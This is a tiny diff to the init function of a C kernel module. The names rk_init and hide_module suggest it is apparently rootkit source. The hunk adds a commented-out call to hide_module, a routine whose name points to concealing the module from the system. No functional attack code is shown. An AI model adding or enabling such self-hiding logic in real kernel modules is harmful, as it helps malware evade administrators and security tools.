@@ -16,6 +16,8 @@ static int rk_init(void) {
         return err;
     }
 
+    //hide_module();
+
     //rk_info("module loaded\n");
 
     return 0;
